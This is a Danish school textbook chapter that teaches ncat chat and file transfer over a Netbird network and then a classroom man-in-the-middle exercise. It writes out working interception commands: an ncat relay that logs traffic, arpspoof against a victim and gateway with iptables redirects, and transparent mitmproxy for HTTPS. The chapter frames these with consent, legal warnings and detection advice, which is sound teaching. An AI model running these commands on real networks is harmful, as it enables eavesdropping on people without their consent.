# Netværk, ncat og manden-i-midten

Dette kapitel handler om, hvordan to laptops kan tale sammen over skolens **Netbird**-
netværk med programmet **ncat** — og hvordan man i en undervisningssituation kan
illustrere et **manden-i-midten**-angreb (man-in-the-middle, MITM).

> ⚠️ **Vigtigt — læs først!**
>
> Alt i afsnittene om manden-i-midten må **kun** bruges:
>
> - på skolens **egne** laptops,
> - i et **øvelsesnetværk** eller på et netværk, du selv ejer eller administrerer,
> - og **kun med din lærers udtrykkelige tilladelse**.
>
> At aflytte, forstyrre eller udgive sig for at være en anden på et netværk, du ikke
> har lov til at bruge, er **ulovligt** (Straffeloven) og kan få alvorlige
> konsekvenser. Eksemplerne her antager, at alle computere er jeres egne, og at alle
> deltagere har sagt ja. Formålet er at **lære, hvordan man beskytter sig** — ikke at
> genere nogen.

## Hvad er ncat?

`ncat` er et lille værktøj til at sende og modtage data over netværk. Det er en del af
programmet **nmap**, som allerede ligger på din laptop. Du åbner **Terminal** og skriver
kommandoerne derfra.

`ncat` kan:

- lytte på en port og vente på forbindelser (`-l`),
- forbinde til en anden computer,
- sende tekst, filer og endda køre programmer,
- bruge TCP, UDP og TLS.

## Find din Netbird-adresse

Netbird giver hver laptop en fast IP-adresse i `100.64.0.0/10`-området. Alle i jeres
Netbird-netværk kan nå hinanden på disse adresser, også selv om I sidder i forskellige
lokaler.

```sh
# Er Netbird oppe? Viser status, netværksnavn og egne adresser.
netbird status

# Mere detaljeret: alle peers (de andre laptops) og deres IP-adresser.
netbird status --detail

# Netbird bruger et WireGuard-interface. Det hedder normalt wt0.
ip -brief addr show wt0
```

Skriv din egen adresse op (fx `100.101.102.103`) og giv den til makkeren, I skal tale
med. De skal gøre det samme.

Hvis Netbird ikke er forbundet:

```sh
netbird up
netbird status
```

## Forbind to laptops med ncat

Vi kalder den ene laptop for **serveren** (den der lytter) og den anden for
**klienten** (den der forbinder). Vælg et portnummer over 1024, fx **5000**.

### 1. Enkel chat (én besked hver vej)

På **serveren**:

```sh
ncat -l 5000
```

På **klienten** (indsæt serverens Netbird-adresse):

```sh
ncat 100.101.102.103 5000
```

Nu kan I skrive til hinanden. Linjerne, du skriver, dukker op hos den anden, når du
trykker **Enter**. Afslut med **Ctrl+D** (eller **Ctrl+C**).

### 2. Bliv ved med at lytte

Med standard-`ncat` lukker serveren, så snart klienten går. Det undgår du sådan:

```sh
ncat -l --keep-open 5000
```

Nu kan flere klienter forbinde efter hinanden.

### 3. Test på din egen maskine

Før I prøver mellem to laptops, kan du teste, om `ncat` virker lokalt. Åbn **to**
terminal-vinduer:

```sh
# Terminal 1
ncat -l 5000
```

```sh
# Terminal 2
ncat 127.0.0.1 5000
```

Skriv noget i terminal 2 — det dukker op i terminal 1.

## Send filer

`ncat` kan sende alle slags data, ikke kun tekst. Igen: serveren lytter, klienten
sender.

På **modtageren**:

```sh
ncat -l 5000 > modtaget.bin
```

På **afsenderen**:

```sh
ncat 100.101.102.103 5000 < billede.png
```

Afslut med **Ctrl+D**, når filen er sendt. Tjek bagefter, at filerne har samme
størrelse:

```sh
ls -l billede.png modtaget.bin
```

Man kan også bruge `--send-only` og `--recv-only`, så `ncat` lukker af sig selv, når
data er sendt:

```sh
# Modtager
ncat -l --recv-only 5000 > modtaget.bin
```

```sh
# Afsender
ncat --send-only 100.101.102.103 5000 < billede.png
```

## Kryptering med ncat --ssl

Som standard er ncat-trafik **ikke** krypteret. Det betyder, at en anden på netværket i
princippet kan læse med. `ncat` kan bruge TLS, hvis begge parter har et certifikat.

Lav et selvsigneret certifikat (kun til øvelse!):

```sh
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout ncat-noegle.pem -out ncat-cert.pem -days 7 \
  -subj "/CN=netbird-oevelse"
```

På **serveren**:

```sh
ncat --ssl -l 5001 --ssl-cert ncat-cert.pem --ssl-key ncat-noegle.pem
```

På **klienten**:

```sh
ncat --ssl 100.101.102.103 5001
```

> Netbird-trafik mellem to peers er allerede krypteret med **WireGuard**. `--ssl`
> lægger et ekstra lag ovenpå (ende-til-ende i programmet selv). Det er nyttigt at
> vide, når vi kommer til manden-i-midten.

## Fejlfinding

| Problem | Løsning |
| --- | --- |
| `Ncat: Connection refused` | Serveren lytter ikke. Tjek, at `ncat -l` kører på den anden maskine, og at portnummeret er det samme. |
| `Ncat: No route to host` | Netbird er ikke oppe, eller adressen er forkert. Kør `netbird status` på begge maskiner. |
| `Ncat: Address already in use` | Porten er optaget. Se hvem der bruger den, eller vælg en anden port. |
| Intet sker | Firewall? Tjek `sudo ss -tlnp | grep 5000` for at se, om nogen lytter. |
| Virker lokalt, men ikke mellem laptops | Skriv `ip -brief addr show wt0` og brug **wt0**-adressen — ikke Wi-Fi-adressen. |

```sh
# Hvilke porte lytter din maskine på lige nu?
ss -tlnp

# Kan du overhovedet nå den anden laptop?
ping 100.101.102.103
```

## Øvelse: manden-i-midten (kun i undervisningen)

Forestil dig tre personer:

```
Elev A  ─────────────►  MitM-laptop  ─────────────►  Elev B
(afsender)               (lytter med)                (modtager)
```

**Elev A** tror, de taler direkte med **Elev B**. I virkeligheden går trafikken gennem
**MitM-laptoppen**, som kan læse og ændre det, der sendes. Det kaldes et
*man-in-the-middle*-angreb.

Der er tre måder at lave øvelsen på, fra den nemmeste til den mest virkelighedstro.

### Variant 1 — ncat som relay (nemmest)

Her er MitM-laptoppen selv den "server", Elev A forbinder til, og den videresender
trafikken til Elev B. Elev A skal altså forbinde til **MitM-laptoppens** adresse i
stedet for Elev B's.

På **MitM-laptoppen** (indsæt Elev B's Netbird-adresse):

```sh
ncat -l 6000 --sh-exec "ncat 100.101.102.104 6000"
```

På **Elev B** (den rigtige server):

```sh
ncat -l 6000
```

På **Elev A**:

```sh
ncat 100.101.102.105 6000      # 105 er MitM-laptoppen, ikke Elev B
```

Alt, hvad Elev A skriver, havner hos Elev B — men MitM-laptoppen kan se det hele. Vil
du gemme det, der bliver sagt, kan du tilføje `--output`:

```sh
ncat -l 6000 --sh-exec "ncat 100.101.102.104 6000" \
  --output /tmp/aflytning.log
```

### Variant 2 — ARP-spoofing + ncat (tættere på virkeligheden)

På et almindeligt **kabel-/Wi-Fi-netværk** (ikke over Netbird) kan man narre en computer
til at tro, at man er netværkets gateway. Det hedder **ARP-spoofing**. Værktøjet
`arpspoof` ligger på laptoppen (fra pakken `dsniff`).

> Netbird-trafik kan **ikke** aflyttes på denne måde, fordi den er krypteret inde i en
> WireGuard-tunnel. Denne variant virker derfor kun i et lokalt øvelsesnetværk, hvor
> I bevidst har slået Netbird fra, eller mellem maskiner på samme Wi-Fi.

På **MitM-laptoppen** — find dit interface og IP-adresser:

```sh
ip -brief addr                  # find fx wlan0 og de lokale adresser
ip route                        # find gateway (default via ...)
```

Slå videresendelse af pakker til:

```sh
sudo sysctl -w net.ipv4.ip_forward=1
```

Start ARP-spoofing i **to** terminaler (byt `<iface>`, `<offer>` og `<gateway>` ud):

```sh
# Fortæl offeret, at jeg er gatewayen
sudo arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1
```

```sh
# Fortæl gatewayen, at jeg er offeret
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.50
```

Nu går offerets trafik gennem MitM-laptoppen. Send trafikken videre til en `ncat`-lytter
ved hjælp af en firewall-regel (omdirigering):

```sh
# Send alt på port 7000 videre til vores ncat-lytter på port 7001
sudo iptables -t nat -A PREROUTING -p tcp --dport 7000 \
  -j REDIRECT --to-ports 7001

# Lytteren videresender til den rigtige server og logger alt
ncat -l 7001 --sh-exec "ncat 192.168.1.60 7000" \
  --output /tmp/aflytning.log
```

På **Elev B** (den rigtige server) og **Elev A** (offeret):

```sh
# Elev B
ncat -l 7000
```

```sh
# Elev A
ncat 192.168.1.60 7000
```

Ryd op igen, når I er færdige (vigtigt!):

```sh
sudo iptables -t nat -D PREROUTING -p tcp --dport 7000 \
  -j REDIRECT --to-ports 7001
sudo sysctl -w net.ipv4.ip_forward=0
# Stop arpspoof med Ctrl+C i begge terminaler
```

Man kan ofte se et ARP-angreb ved at kigge efter **den samme MAC-adresse** på flere
IP-adresser:

```sh
ip neigh
```

### Variant 3 — TLS-aflytning med mitmproxy

Over `--ssl` eller HTTPS kan en simpel `ncat`-lytter **ikke** læse indholdet — den ser
kun uforståelige bytes (krypteret tekst). For at vise, hvordan man alligevel kan komme
ind på det, bruger man et **proxy**-værktøj som `mitmproxy`. Det kræver, at offerets
maskine installerer og stoler på mitmproxys certifikat (noget man aldrig bør gøre på en
maskine, man ikke selv ejer).

Start den transparente proxy på **MitM-laptoppen**:

```sh
# Åbner et web-interface på http://127.0.0.1:8081 og en proxy på port 8080
mitmweb --mode transparent --listen-port 8080

# Certifikatet, som offeret skal installere (i en rigtig øvelse):
ls ~/.mitmproxy/mitmproxy-ca-cert.pem
```

Send trafikken gennem proxyen med en firewall-regel:

```sh
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j REDIRECT --to-ports 8080
```

Når offeret først stoler på mitmproxy-certifikatet, kan `mitmweb` vise al trafik i
klartekst i browseren. Uden certifikatet får offeret en **certifikat-advarsel** — og
det er netop pointen: det er sådan, man opdager aflytningen.

Vil du i stedet se, at trafikken faktisk **er** krypteret, kan I optage den og åbne
optagelsen (I kan ikke læse teksten, og det er hele pointen):

```sh
# Gem en pcap-fil, og åbn den i termshark
sudo tcpdump -i wlan0 -w /tmp/trafik.pcap port 5001
termshark -r /tmp/trafik.pcap
```

## Hvordan opdager man en manden-i-midten?

Her er det vigtigste ved hele kapitlet — **forsvaret**:

- **Certifikater skal tjekkes.** En browser eller et program skal advare, hvis
  certifikatet ikke passer. Klik aldrig "accepter alligevel" uden grund.
- **Netbird beskytter mellem peers.** Trafik mellem to Netbird-maskiner er krypteret og
  godkendt med WireGuard. Man kan altså ikke bare ARP-spoofe sig ind på den.
- **Kend dine peers.** `netbird status --detail` viser, hvem der er med i netværket.
  Er der en maskine med, som ikke burde være der, så sig det til din lærer.
- **Usædvanlige MAC-adresser.** To IP-adresser med samme MAC-adresse i `ip neigh` kan
  være et tegn på ARP-spoofing.
- **Ukendte mellemled.** En tunnel, proxy eller "relay", du ikke selv har sat op, er
  mistænkelig.
- **`ncat --ssl` er ikke nok alene.** Det krypterer forbindelsen, men certifikatet skal
  stadig bekræftes ved en kendt og betroet kilde.

## Opgaver til eleverne

1. **Chat:** Få en `ncat`-chat til at virke mellem to laptops over Netbird. Hvilken
   adresse brugte I, og hvorfor ikke Wi-Fi-adressen?
2. **Filoverførsel:** Send et billede fra den ene laptop til den anden. Tjek, at
   filerne er **bit for bit** ens (brug fx `sha256sum` på begge).
3. **Relay:** Sæt Variant 1 op med tre laptops. Kan I se forskel på MitM-laptoppens
   log og den rigtige samtale? Hvornår ville I opdage det som bruger?
4. **TLS:** Prøv `ncat --ssl`. Hvad ser en `tcpdump`-optagelse af trafikken? Hvorfor
   kan I ikke læse teksten?
5. **Forsvar:** Forklar med egne ord, hvorfor ARP-spoofing ikke virker mod Netbird, og
   hvad man selv kan gøre for at opdage en manden-i-midten.

## Til læreren

- Sæt et **isoleret øvelsesnetværk** op (fx et gæste-Wi-Fi uden adgang til skolens
  øvrige net), eller slå Netbird fra på de deltagende maskiner under Variant 2 og 3.
- Del kun Netbird-adresserne mellem de grupper, der skal arbejde sammen.
- Ryd altid op efter øvelsen: `iptables`-regler, `ip_forward`, `arpspoof`-processer og
  certifikater.
- Brug gerne øvelsen som afsæt for en snak om **samtykke, lovgivning og digital
  sikkerhed** — ikke bare teknik.

Videre til [Få hjælp](faa-hjaelp.md).
